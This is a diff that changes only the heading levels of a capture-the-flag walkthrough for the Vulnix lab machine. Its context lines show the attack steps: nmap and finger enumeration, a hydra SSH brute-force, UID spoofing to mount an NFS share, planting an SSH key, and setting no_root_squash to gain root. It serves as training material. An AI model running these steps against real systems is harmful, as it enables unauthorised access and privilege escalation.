@@ -1,7 +1,7 @@
-### VULNIX
+# VULNIX
 
 
-#NMAP
+### NMAP
 
 kali@kali:~$ nmap 192.168.1.100 -sV -sT -A
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-10 13:44 CET
@@ -68,7 +68,7 @@ PORT     STATE SERVICE    VERSION
 Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
-#FINGER
+### FINGER
 
 kali@kali:~$ finger root@192.168.1.100
 Login: root           			Name: root
@@ -98,7 +98,7 @@ No mail.
 No Plan.
 
 
-#NFS
+### NFS
 
 root@kali:/home/kali# showmount -e 192.168.1.100
 Export list for 192.168.1.100:
@@ -109,7 +109,7 @@ root@kali:/home/kali# mount --source 192.168.1.100:/home/vulnix --target /home/v
 Permission denied T.T'
 
 
-#BRUTEFORCE
+### BRUTEFORCE
 
 kali@kali:~$ hydra -l user -P rockyou.txt 192.168.1.100 ssh -t 4
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -132,7 +132,7 @@ root:x:0:0:root:/root:/bin/bash
 vulnix:x:2008:2008::/home/vulnix:/bin/bash
 
 
-#ACCESS TO NFS
+### ACCESS TO NFS
 
 root@kali:/home/kali# groupadd vulnix -g 2008
 root@kali:/home/kali# useradd vulnix -u 2008 -g 2008 -s /bin/bash
@@ -149,7 +149,7 @@ drwxr-xr-x 4 root   root   4096 Mar 10 16:04 ../
 -rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
 
 
-#GETTING SSH WITH VULNIX
+### GETTING SSH WITH VULNIX
 
 kali@kali:~$ ssh-keygen -t rsa
 kali@kali:~$ cat .ssh/id_rsa.pub 
@@ -161,7 +161,7 @@ vulnix@kali:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDT1Mw6+iVZcmCHOe
 kali@kali:~$ ssh -l vulnix 192.168.1.100
 
 
-#PRIVILEGE ELEVATION
+### PRIVILEGE ELEVATION
 
 vulnix@vulnix:~$ sudo -l
 Matching 'Defaults' entries for vulnix on this host:
@@ -191,7 +191,7 @@ root@kali:/mnt/root# cat trophy.txt
 cc614640424f5bd60ce5d5264899c3be
 
 
-#GETTING ROOT SHELL
+### GETTING ROOT SHELL
 
 vulnix@vulnix:~$ sudoedit /etc/exports
 /home/vulnix    *(rw,no_root_squash) <- MODIFIED
